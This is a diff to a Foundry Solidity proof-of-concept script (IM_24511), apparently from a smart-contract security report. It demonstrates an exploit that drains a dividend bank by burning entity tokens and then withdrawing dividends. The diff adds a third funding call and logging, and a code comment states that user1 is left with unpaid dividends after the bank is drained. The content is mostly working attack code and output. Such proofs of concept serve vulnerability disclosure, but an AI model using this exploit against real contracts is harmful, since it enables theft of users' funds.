@@ -64,6 +64,7 @@ contract IM_24511 is Script {
         fundEntityUsdc(user1, 1000000 * 1e6); // 1st payDividend
         fundEntityUsdc(user2, 1000000 * 1e6);
         fundEntityUsdc(user2, 1000000 * 1e6); // 2nd payDividend
+        fundEntityUsdc(user2, 1000000 * 1e6); // 3rd payDividend
 
         c.log(" ~~ user1Id ptoken setup ~~".blue());
         vm.startPrank(sa);
@@ -76,6 +77,7 @@ contract IM_24511 is Script {
 
         n.payDividendFromEntity(0x0000000000000000000000000000000000000000000000000000000000000011, 1000000 * 1e6);
         c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
 
         c.log(" ~~ attackEntityId ptoken setup ~~".blue());
         vm.startPrank(sa);
@@ -89,9 +91,10 @@ contract IM_24511 is Script {
 
         n.payDividendFromEntity(0x0000000000000000000000000000000000000000000000000000000000000022, 1000000 * 1e6);
         c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
 
         c.log("!!!!!!!!!! attack start !!!!!!!!!!");
-        c.log("user3 can withdraw: %s", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
 
         vm.startPrank(sa);
         n.startTokenSale(attackEntityId, 1e6, 1e6);
@@ -101,16 +104,19 @@ contract IM_24511 is Script {
 
         c.log(">>>>> attack entity admin burn some entity tokens ...");
         n.externalWithdrawFromEntity(attackEntityId, user2, attackEntity, 1e6);
-        c.log("user3 can withdraw: %s", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
 
         c.log("user2 parent's internal USDC balance: %s", n.internalBalanceOf(n.getEntity(user2Id), USDC_ID));
 
         vm.startPrank(user3);
         n.withdrawDividend(user3Id, attackEntityId, USDC_ID);
-        c.log("user3 can withdraw: %s", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
+        // note user1 has withdrawable dividends, but the dividend bank has been drained by the attack
+        c.log("user1 can withdraw: %s dividends", n.getWithdrawableDividend(user1Id, user1Id, USDC_ID));
+        c.log("user3 can withdraw: %s dividends", n.getWithdrawableDividend(user3Id, attackEntityId, USDC_ID));
+        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
 
         c.log("!!!!!!!!!! attack success !!!!!!!!!!");
-        c.log("bank's internal USDC balance: %s", n.internalBalanceOf(LC.DIVIDEND_BANK_IDENTIFIER._stringToBytes32(), USDC_ID));
         c.log("user3's internal USDC balance: %s", n.internalBalanceOf(user3Id, USDC_ID));
     }
 }
